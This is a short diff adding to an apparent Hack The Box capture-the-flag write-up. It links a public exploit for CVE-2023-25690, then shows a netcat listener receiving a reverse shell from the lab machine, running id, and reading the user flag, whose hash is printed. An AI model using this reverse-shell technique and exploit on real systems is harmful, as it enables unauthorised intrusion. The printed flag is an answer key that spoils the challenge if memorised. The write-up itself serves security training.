@@ -17,4 +17,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
 
 
+https://github.com/dhmosfunk/CVE-2023-25690-POC
+
+
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/3a775ef7-e6e8-44e4-b396-aaef44ed2d4f)
+
+
+└──╼ [★]$ nc -lvnp 9999
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+id
+Ncat: Connection from 10.129.151.159.
+Ncat: Connection from 10.129.151.159:53744.
+/bin/sh: 0: can't access tty; job control turned off
+$ uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+$ cat user.txt
+e20a5ccbdad3cce7edff4b74ff13f303
 
